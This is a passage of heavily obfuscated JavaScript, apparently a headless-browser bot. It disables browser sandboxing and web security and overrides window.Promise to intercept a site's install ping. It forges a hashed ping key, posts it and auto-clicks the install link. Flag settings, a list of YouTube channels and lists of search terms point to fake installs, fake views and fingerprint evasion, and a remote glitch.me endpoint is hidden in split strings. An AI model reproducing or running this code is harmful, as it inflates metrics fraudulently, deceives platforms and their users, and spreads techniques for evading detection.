                J[-0x6b6 + 0x15 * -0xbf + 0x1671] = this['block'], J[K >> -0x1c42 + 0x25fa + -0x9b6] |= x[-0x25e3 + -0x1a55 * -0x1 + 0xb91 & K], this['block'] = J[-0x1 * -0x25dc + -0x13d4 + -0x11f8], K >= -0x1 * -0x1c37 + -0x806 + 0x1 * -0x13f9 && (this['hashed'] || this['hash'](), J[-0x1cc9 * 0x1 + -0x1 * -0x1fba + -0x3 * 0xfb] = this['block'], J[-0x1d * -0xb8 + 0x72e + 0x4a9 * -0x6] = J[-0x1 * 0xfb5 + 0x44f * -0x4 + 0x20f2] = J[-0x218f + -0x8 * -0x3f8 + 0x3 * 0x9b] = J[-0xd8b * -0x1 + -0x1907 + 0x1b * 0x6d] = J[-0x1a0b + -0x1180 + 0x2b8f] = J[-0x1dd2 + -0x45e + -0x1a1 * -0x15] = J[-0x2340 + 0x1825 + 0xb21] = J[0x1911 + -0x1cfc + 0x2 * 0x1f9] = J[-0x503 * -0x6 + 0xa36 * 0x1 + 0x10 * -0x284] = J[0x22be + -0x1e9 * -0x7 + -0x1 * 0x3014] = J[-0x1 * 0x1003 + 0x1 * -0xd81 + 0x1d8e] = J[0x268c + 0x9f4 + -0x1 * 0x3075] = J[-0xa6 + 0x16cd + 0x1 * -0x161b] = J[-0x1f4d + 0x84d + 0x170d] = J[0x24b6 + 0xd0c + -0x4 * 0xc6d] = J[-0x4 * -0x5c3 + 0x1431 + -0x2b2e] = 0xb2b * -0x1 + 0x17e7 + -0xcbc), J[0x10 * -0x116 + -0x13 * 0x91 + 0x1 * 0x1c31] = this['hBytes'] << -0x182e + 0x21cc + -0x99b | this['bytes'] >>> -0x1 * 0x134f + -0xbf9 + 0x1 * 0x1f65, J[0x23d0 + -0x14b * -0x15 + -0x3ee8] = this['bytes'] << 0x108a + -0x2 * -0xaba + -0x25fb, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1 * -0x1934 + -0xdc * -0xb + 0xd8 * -0x29; J < 0x9b2 + 0x3b8 * -0xa + -0x1 * -0x1bce; ++J)
                K = Q[J - (0x3 * -0x6a3 + 0xf7c + 0x470)] ^ Q[J - (0x808 * 0x2 + 0x1 * 0x1b85 + 0x1 * -0x2b8d)] ^ Q[J - (-0x2181 + 0x11a * -0xb + -0xb * -0x427)] ^ Q[J - (-0x47 * 0x1f + -0xad9 + 0x1382)], Q[J] = K << 0x2c1 + 0x2 * 0xa7d + -0x17ba | K >>> 0x1 * 0xea5 + 0x1a6b + -0x28f1 * 0x1;
              for (J = 0x58b + 0xafd + -0xb8 * 0x17; J < -0x20f3 + -0xe0e * -0x1 + 0x12f9; J += 0x1799 + -0x1ec1 + 0x72d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xc87 + 0x1e34 + -0x2ab6 | L >>> 0x3 * -0x4d1 + -0xcd7 * -0x2 + 0x4 * -0x2c8) + (M & N | ~M & O) + P + (-0x4b16fb2 + 0x38bd16 * 0x108 + -0x24b0ea9b * -0x1) + Q[J] << -0x21bb + 0x830 + -0xd * -0x1f7) << 0x109b + 0x139 * -0x1 + 0x9 * -0x1b5 | P >>> 0x1a05 + -0x3c0 + -0x2 * 0xb15) + (L & (M = M << 0x23 * -0x7f + 0x1b2f + -0x9b4 | M >>> -0x5 * -0x9b + 0x54e + -0x853) | ~L & N) + O + (0xb481f66a + -0xc29aecf * 0x4 + 0x3 * -0xdc84087) + Q[J + (0x264c + 0x662 + -0x2cad)] << -0x728 * -0x5 + -0x1 * 0x12e7 + 0x1 * -0x10e1) << 0x1 * -0x1106 + 0x12af + -0x1a4 | O >>> 0x2112 + -0x25b2 + 0x4bb) + (P & (L = L << -0x3 * -0x4f1 + -0x1c * -0x21 + -0x1251 | L >>> -0x1 * -0xed5 + -0xc87 + -0x24c) | ~P & M) + N + (0x42555bde + -0x5b1d1 * 0x11da + 0x7dd56ab5) + Q[J + (-0x79 * 0x46 + 0x21ab + -0x93)] << 0x63 * -0x25 + -0x1 * 0x1f1b + 0x2d6a) << 0x25 * 0x89 + -0x2451 + 0x53 * 0x33 | N >>> 0xfcd + 0x1330 + -0xbe * 0x2f) + (O & (P = P << 0x6e2 + 0x4f * 0xf + -0x1 * 0xb65 | P >>> -0x1 * 0xac7 + 0x95f + 0x16a) | ~O & L) + M + (0x35f6e07 * 0x16 + -0x137 * -0x704753 + -0x2 * 0x3c0bd06b) + Q[J + (0x17c2 + -0x18aa + 0xeb)] << -0x1c04 * -0x1 + 0x20 * -0x94 + 0x1 * -0x984) << -0x77 * -0x3f + 0xfa6 * 0x1 + -0x2cea | M >>> 0x195b + 0x5 * 0x4e3 + 0x229 * -0x17) + (N & (O = O << 0x1 * -0xdc6 + 0x610 * -0x2 + 0x1a04 | O >>> 0x246 * -0x1 + -0x16d7 + 0x191f) | ~N & P) + L + (0x7 * -0x176adbed + -0x1a * 0x1ff0ba9 + -0xf14c26 * -0x145) + Q[J + (-0x1 * -0xde3 + 0x16 * 0x17b + -0x2e71)] << 0x17cc * 0x1 + 0xc * 0x210 + 0x1de * -0x1a, N = N << -0x1 * -0x129f + -0xa * 0x19c + 0x1 * -0x269 | N >>> 0x10fc + 0x222d * 0x1 + -0x3327;
              for (; J < 0x83 * 0x27 + 0x78e * 0x1 + 0x95 * -0x2f; J += 0x7c5 + 0x15 * -0x30 + -0x3d0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x220b + 0x4 * -0x944 + 0x4720 | L >>> 0xd * -0x4f + -0x34 * -0x67 + -0x9 * 0x1de) + (M ^ N ^ O) + P + (-0x12 * -0x7d58db5 + 0x3cacae97 * -0x1 + 0x1e82a37e) + Q[J] << 0x1 * 0x577 + 0x1 * -0x192 + 0x3e5 * -0x1) << 0x2320 + 0x94 * 0x8 + -0x27bb | P >>> -0x3e5 * -0x8 + -0x1ffb + 0xee) + (L ^ (M = M << -0x2696 + 0x1 * 0xaa9 + 0x1c0b | M >>> 0x338 * -0xc + 0x9c2 + 0x1ce0 * 0x1) ^ N) + O + (0x4155a86 + -0x48c4f6a + -0x1 * -0x6f50e085) + Q[J + (-0xbcd + -0x189e + 0x12 * 0x206)] << 0x1c6c + -0x1 * -0x2429 + -0x4095) << 0x1507 + -0x19ab * -0x1 + 0x3 * -0xf8f | O >>> -0x4 * -0x367 + -0x965 + 0x4 * -0x107) + (P ^ (L = L << -0x6a * 0xd + -0x2421 + -0x1 * -0x29a1 | L >>> -0x8c2 * 0x3 + -0x1670 + 0x30b8) ^ M) + N + (0x1f * -0x4f8d009 + -0xa8a230e0 + -0x3633a9b3 * -0x8) + Q[J + (-0x27 * -0xfd + 0x2f * 0x11 + -0x29a8)] << 0x92c + -0xd14 + 0x3e8) << -0x49 * -0x18 + -0x861 + 0x18e | N >>> -0x1 * 0x2581 + 0xdb5 + 0x17e7) + (O ^ (P = P << 0x1 * -0x18a7 + 0x73 * -0x29 + 0x2b30 | P >>> -0x1f60 * 0x1 + 0x1090 + 0xed2 * 0x1) ^ L) + M + (-0x1 * 0x7b95d016 + -0x6fea40f4 + -0x1 * -0x15a59fcab) + Q[J + (-0x707 + -0xedb + -0x15e5 * -0x1)] << -0x79 * 0x25 + 0x1865 * -0x1 + 0x29e2) << 0x6a6 + -0x25bc + 0x1f1b | M >>> 0x12c4 + 0x1f * 0x17 + -0x1572) + (N ^ (O = O << 0x195f + -0x2374 + 0x1 * 0xa33 | O >>> 0x20f8 + 0x1a3e + -0x3b34) ^ P) + L + (0x8701da75 + -0x3d9485c2 + 0x256c96ee * 0x1) + Q[J + (0x190 * -0x18 + 0x27e * 0x7 + 0x1 * 0x1412)] << -0x379 * -0xb + -0x1 * 0x26e5 + 0xb2, N = N << -0x1002 + 0x472 + 0xbae | N >>> 0x12f + 0xc * -0x331 + 0xd * 0x2db;
              for (; J < 0x22a1 + 0x136c + -0x35d1; J += -0x2 * 0x1143 + 0x160d + 0x1a * 0x7b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1c9b + 0x2f2 + -0x1f88 | L >>> 0x63f * -0x4 + -0x1d2f + 0x3646) + (M & N | M & O | N & O) + P - (0x74dc36f6 + -0x30daddc7 * 0x1 + 0x287 * 0x11c2a3) + Q[J] << 0x1b56 + -0x1623 + -0x533) << -0x1d * 0xc9 + -0xb * 0x2a6 + -0x19f6 * -0x2 | P >>> -0x187a * -0x1 + 0x2 * -0x12dd + 0xd5b) + (L & (M = M << -0x2 * 0x10b9 + -0x9 * 0x14d + -0x1 * -0x2d45 | M >>> -0x9 * -0x33f + 0x5 * 0x693 + -0x3e14) | L & N | M & N) + O - (0x3 * 0x42a33be0 + 0x9e7730ce + -0x7abe50a5 * 0x2) + Q[J + (0x10b4 + 0x5f9 * 0x1 + -0x16ac * 0x1)] << -0xaa2 * 0x2 + 0x1535 + 0x5 * 0x3) << 0x1 * -0xe13 + -0x1efe + -0x1 * -0x2d16 | O >>> -0x10c3 + 0x1 * -0x1d4a + 0x2e28) + (P & (L = L << -0x23c9 * -0x1 + -0x1 * -0x1cf + -0x257a | L >>> 0x8 * 0x1f2 + -0xf17 + -0x77) | P & M | L & M) + N - (-0x5dd05fa2 + -0x5 * -0x162d3201 + 0x5fd2a8c1) + Q[J + (-0x1738 + -0x79 * -0x22 + 0x728)] << -0x545 * -0x3 + -0x22f1 + 0x1322) << 0x4c * -0x65 + -0x1085 + 0x2e86 | N >>> 0x9d * 0x2c + -0xdef + -0xcf2) + (O & (P = P << 0x2 * 0x6d9 + 0x3d * -0x20 + -0x2fa * 0x2 | P >>> -0x20a * 0xe + 0x25f2 + -0x964) | O & L | P & L) + M - (-0x36d811 * -0x35e + 0x7879f96d + -0xc0413f87) + Q[J + (-0x2a * -0xa7 + -0x150 * 0x1b + 0x80d)] << -0x2664 + -0x18c9 + 0x3f2d) << -0x71 * 0xe + -0x190a + 0x1f3d | M >>> 0x573 + -0x24d * 0x1 + -0x30b) + (N & (O = O << 0x22c * -0x4 + 0x246e + -0x1ba0 | O >>> -0x1708 + 0x372 + 0x1398) | N & P | O & P) + L - (-0xbc9343f * 0xb + -0x97bf903c + -0x18a491215 * -0x1) + Q[J + (0x143 * -0x7 + 0x99f + 0xb * -0x12)] << 0x65d + -0x41 * -0x16 + -0xbf3, N = N << 0x2 * -0x7e1 + -0xf89 + 0x2b * 0xbb | N >>> 0x4f * -0x16 + -0xa6 * 0x37 + 0x87e * 0x5;
              for (; J < 0xb87 * 0x1 + 0x1681 + -0x10dc * 0x2; J += -0x1c4c + 0x1409 + -0x6a * -0x14)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x20e8 + -0x1fc0 + 0x40ad | L >>> -0xbd3 + -0x137 + 0xd25) + (M ^ N ^ O) + P - (0x1f682f * 0x25e + 0x4c25 * 0xeb7 + 0x191bd58b * -0x1) + Q[J] << -0x2567 * -0x1 + 0x2222 + -0x4789) << 0x36e + 0x1a76 + -0x1ddf * 0x1 | P >>> 0x8eb + 0x1 * -0xbf6 + 0x326) + (L ^ (M = M << 0x1e63 + -0x314 * -0x9 + 0x3 * -0x1353 | M >>> -0x18f4 + 0x1f6e + -0x678) ^ N) + O - (-0x1 * 0xbfe10b9 + -0x1 * 0x1788d6c3 + 0x592425a6 * 0x1) + Q[J + (0x1 * 0x74f + 0x4 * -0x78a + 0x16da)] << -0x1 * -0x224f + 0x1d * 0x36 + -0x286d) << -0x252f + -0xb * -0x172 + 0x154e | O >>> -0x29 * -0xd + 0x36f * 0x3 + -0x1 * 0xc47) + (P ^ (L = L << 0x1c34 + -0x482 + -0x1794 | L >>> -0x1 * 0x1e11 + -0x1 * -0x2685 + -0x872) ^ M) + N - (0x1 * -0x3fa0704b + 0x3b24be76 + -0x3a18efff * -0x1) + Q[J + (0x1 * 0x1061 + 0x61d * -0x1 + -0xa42)] << -0x1 * -0x1299 + 0x1faf * 0x1 + 0x649 * -0x8) << 0xb93 * -0x1 + 0xa * 0x347 + 0x152e * -0x1 | N >>> -0x1 * -0x1565 + -0x1 * 0x2ad + -0x129d) + (O ^ (P = P << 0xac + -0xa32 + 0x269 * 0x4 | P >>> 0x162a + 0xfd2 + 0x25fa * -0x1) ^ L) + M - (0x2b20fe70 + 0x54e22fe8 + -0x4a65f02e) + Q[J + (0x22ee + 0x1 * 0x1ef5 + -0x41e0)] << -0x128 * 0x1b + 0x1d * 0x1f + -0x1 * -0x1bb5) << 0x1c5e + -0x1547 * -0x1 + -0x31a0 * 0x1 | M >>> 0x17c7 + 0x607 * -0x1 + -0x11a5 * 0x1) + (N ^ (O = O << 0x120a + 0x15df + -0x1 * 0x27cb | O >>> -0x3 * -0xc5b + -0x1480 + 0x1b * -0x9d) ^ P) + L - (-0x35bb46dd + 0x47fa9a2c + 0x2ae8d9 * 0xd3) + Q[J + (0xd * 0x5b + -0x1257 + 0xdbc)] << 0x1 * 0x48f + -0x2 * -0x422 + -0x31 * 0x43, N = N << -0x9 * 0x48 + -0x885 * -0x3 + -0x16e9 | N >>> 0x17 * -0x10d + 0x30b + 0x1522;
              this['h0'] = this['h0'] + L << 0xe67 + -0x3dd + -0xa8a, this['h1'] = this['h1'] + M << -0x514 + 0x7 * 0x2de + -0xefe, this['h2'] = this['h2'] + N << -0x2073 * -0x1 + 0x738 + 0x3 * -0xd39, this['h3'] = this['h3'] + O << -0x1 * -0x1eef + 0x1c9e + -0x3b8d, this['h4'] = this['h4'] + P << 0x1ca2 + -0x16e3 + 0x5bf * -0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x725 * -0x1 + -0x1033 + 0x92a & -0x41f + -0x4b7 * 0x5 + 0x1bc1] + w[J >> 0x8f7 + 0x1 * 0x1cfd + -0x12ee * 0x2 & 0x1cd9 + 0x189c + -0x557 * 0xa] + w[J >> -0x240d + -0x54e + 0x296f & -0x596 * 0x2 + 0x7e8 + 0x353 * 0x1] + w[J >> -0x1 * 0x1bb6 + -0x1bcb + 0x239 * 0x19 & -0x18e1 + 0x20e3 * -0x1 + 0x39d3] + w[J >> -0x3 * -0xb17 + -0x2563 * -0x1 + 0x469c * -0x1 & 0x1 * 0x183f + -0x652 + -0x11de] + w[J >> -0xb5 * -0xa + -0xa * -0x35 + -0x91c & 0x302 + -0x1aec * 0x1 + 0x13 * 0x143] + w[J >> 0x1 * 0x1d96 + 0xe2d * -0x1 + -0xf65 * 0x1 & 0x1 * -0x1d82 + -0x1 * -0x5d1 + 0x1 * 0x17c0] + w[0x1cb7 + 0xf25 + -0x2bcd & J] + w[K >> 0xd0 * 0x5 + 0xf6 * 0x1b + 0x1 * -0x1de6 & -0x9 * 0x379 + 0x80b + 0x1745 * 0x1] + w[K >> -0x169e + -0x33 * 0x5d + 0x293d & 0xe7b * -0x2 + -0x1 * 0x25ff + -0x4304 * -0x1] + w[K >> 0x2097 + -0x2 * -0xf65 + 0x1cf * -0x23 & -0x11 * -0x4f + 0x1 * -0x120e + 0xcde] + w[K >> 0xeb5 + -0x1b19 + 0xc74 & 0xbc4 + -0x13 * 0x1cb + -0x2 * -0xb2e] + w[K >> -0x1d75 + -0xaf0 + -0xcb * -0x33 & 0x73 + -0x1aec + 0x1a88] + w[K >> 0x1773 + 0x22d * 0x7 + -0x26a6 * 0x1 & -0x31 * -0xb9 + 0x2f * -0x2c + 0xda3 * -0x2] + w[K >> 0x3b6 + -0xe61 + 0xaaf * 0x1 & -0x182c + 0xfa0 + 0x89b] + w[0x264b * -0x1 + 0x2 * 0xc5d + -0x8 * -0x1b4 & K] + w[L >> 0x1 * 0x12f9 + 0x1 * -0x26bf + -0x2 * -0x9f1 & -0x10 * 0x257 + -0x1 * 0x1e8f + 0x440e] + w[L >> -0x1989 + -0x90e * -0x2 + 0x785 & 0x1 * 0x2371 + 0x14ef + -0x3851] + w[L >> 0xf8a + -0x258 + -0x49 * 0x2e & 0x49 * -0xd + 0x14b * -0x1c + 0x27f8] + w[L >> -0x42e * 0x6 + 0x2 * 0xc8f + 0x6 & -0x30e + 0x1cb + -0x2 * -0xa9] + w[L >> 0xb7d + 0x61e * -0x3 + 0x1 * 0x6e9 & 0x74 + 0x289 + -0x2ee] + w[L >> 0x1edd + 0x1866 + -0x623 * 0x9 & -0x9b7 + 0x2211 + -0x184b] + w[L >> -0x1f83 * 0x1 + -0x94 * 0x32 + 0x3c6f & -0x1bd1 + 0x1aee + 0x16 * 0xb] + w[0x1ca * 0xf + -0xd24 + -0xda3 & L] + w[M >> -0x2451 + 0xd0e + 0x175f & 0x25aa + -0x1ea3 + -0x1be * 0x4] + w[M >> 0x1851 + 0x218d + -0x39c6 & -0x1e24 + -0x9cb + 0x27fe] + w[M >> -0x158b + -0x1ba9 * -0x1 + 0x1 * -0x60a & -0x167 * 0x4 + -0x1651 * 0x1 + 0x1bfc] + w[M >> -0x1174 * 0x1 + -0x4 * 0x84c + 0x1 * 0x32b4 & -0x54e + 0xbe * 0x17 + -0xbb5] + w[M >> 0x5 * -0x74f + 0xda6 + -0x347 * -0x7 & -0x25 * 0xd + 0x17b * -0xb + 0x1239] + w[M >> 0x20d7 + 0x1465 + -0x14 * 0x2a9 & -0x198d + -0x898 + -0xb * -0x31c] + w[M >> -0x9e2 + -0x49f * 0x5 + -0x1 * -0x2101 & 0x287 * -0x2 + 0x3 * -0xa01 + 0x232 * 0x10] + w[-0x896 + 0x17ec + -0x1 * 0xf47 & M] + w[N >> 0x11a2 * 0x1 + -0x1 * -0x2383 + 0x3509 * -0x1 & 0x2599 + 0xebd + 0x3447 * -0x1] + w[N >> -0xd1e + -0xf5f + -0x3 * -0x987 & -0xd * -0x74 + -0x54 * -0x65 + 0x26f9 * -0x1] + w[N >> 0x246e + 0xe9 * 0xb + -0x391 * 0xd & -0x25d3 + 0x1 * -0x2485 + 0x4a67] + w[N >> -0x2e6 * -0x3 + -0xd5 * -0x28 + 0x25 * -0x122 & 0x2054 + 0x87b + 0x4 * -0xa30] + w[N >> 0x39 * -0x7a + 0x5 * -0x1e + 0x6 * 0x4a2 & -0x2 * 0x42d + -0x142d + -0x1c96 * -0x1] + w[N >> 0x30 * -0x84 + -0x924 + -0x1a * -0x14e & -0x1042 * -0x1 + 0x1ca7 + -0x2cda] + w[N >> 0xcb * -0x26 + -0x606 + 0x5 * 0x73c & -0x1b8b + 0x16d * 0xd + 0x911] + w[-0x12e9 + 0x3bb + -0xf3d * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x15dd + -0x7df * -0x2 + 0x637 & -0x11 * 0xa0 + -0x29a + 0xe39,
                J >> 0x52a * 0x5 + 0x22db + 0x3b * -0x107 & -0xbb * -0x26 + 0x1d79 + -0x383c,
                J >> -0x194f + 0x1e12 + -0x4bb & 0xa * -0x233 + -0x7 * 0x2ea + 0x2b63 * 0x1,
                -0x15ca + -0xdf * -0x7 + 0x10b0 & J,
                K >> 0x1db + 0x11b * -0x1 + -0xa8 * 0x1 & -0x1f76 + 0x3ab + 0x1cca,
                K >> -0x1 * 0x255c + 0x1fd4 + 0x4 * 0x166 & 0x387 * 0x7 + -0x3a * -0x30 + -0x2292,
                K >> 0x261 + -0x10e2 + 0x1 * 0xe89 & -0x9 * 0x27c + 0x1ea4 + 0x1 * -0x749,
                0x9bd + -0x1a11 * -0x1 + -0x1 * 0x22cf & K,
                L >> 0xda0 + -0x1d0 + -0xbb8 & 0x25f5 + 0x1 * -0x1eca + 0x4 * -0x18b,
                L >> 0x25c * 0xe + -0x2 * -0xdd + -0x22b2 & -0xa82 + -0x1754 + 0x22d5,
                L >> 0xc * -0x315 + -0x18e1 + 0x3de5 & 0xf2e + 0x1ba7 * 0x1 + -0x276 * 0x11,
                -0x5e * 0x68 + 0x3 * -0x42f + 0x134 * 0x2b & L,
                M >> 0x9f4 + 0x3 * 0x217 + -0x1 * 0x1021 & -0x12d4 + 0x2a * -0x65 + 0x1 * 0x2465,
                M >> -0x26bd + 0xbc7 + 0x1 * 0x1b06 & 0x19dc * 0x1 + 0x2f * -0xac + 0xbf * 0x9,
                M >> 0xa3 * 0x3d + -0x526 * 0x7 + -0x2c5 & 0x9 * 0x14b + 0x643 * 0x2 + -0x172a * 0x1,
                -0x177a + -0x3 * 0x6d9 + 0x2d04 & M,
                N >> -0x20f9 + -0xe2 * 0xa + 0x29e5 & -0x1e23 + -0x247d + 0x439f,
                N >> -0x2680 + -0x1247 * 0x1 + 0x38d7 * 0x1 & 0x21a4 + -0x1e0 * 0x3 + -0x1b05 * 0x1,
                N >> -0x21dc + 0x7 * 0x131 + 0x198d & -0x6ae + -0xf * -0x21b + -0x17e8,
                -0x6e0 + 0xa6 * -0x27 + 0x2129 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x19da + 0x142f + 0x5bf), (K = new DataView(J))['setUint32'](0x582 + -0x5 * 0x523 + -0x142d * -0x1, this['h0']), K['setUint32'](-0x1 * -0x1efd + 0x800 + 0xb * -0x38b, this['h1']), K['setUint32'](-0x19ed + -0x8 * 0xf + -0x8cf * -0x3, this['h2']), K['setUint32'](0xc46 * 0x1 + 0x8e * -0x7 + -0x858, this['h3']), K['setUint32'](-0x1b * -0x10c + -0x1bd + 0x1a77 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x399 + 0x192c + 0x731 * -0x3];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1fa5 + -0x119 * -0xb + 0x4 * -0xaee;
            J[-0x46 * -0x7b + 0x1 * -0x9d + -0x1 * 0x2105]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1 * 0x2671 + 0x52d + -0x2b9e] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x3d4 + -0xa35 * -0x1 + -0x110 * 0x6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x18d * -0x13 + 0x2 * 0x5fe + 0x5d4 * 0x3;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1299 + -0x200 + 0xd * 0x209), Promise['resolve'](-0x1 * -0x1115 + 0x19 * -0x13a + -0x4a * -0x2f);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x267 * 0xf + 0x1 * -0x3be + 0x27c7; j < 0x9f7 * -0x3 + -0x3 * -0x721 + 0x883; j++)
    i();
}
const NETWORK_PATIENCE = -0x221a + -0x31bf + -0x47 * -0x19f + (0x10b8 + -0x5de * -0x5 + 0xa * -0x36f) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x172f + 0x89c + -0x2a6 * 0xc) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + V(0xf) + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + W(0x4, 'qxii') + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x3b * -0x56 + -0x8e * -0xe + -0x6 * 0x499; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 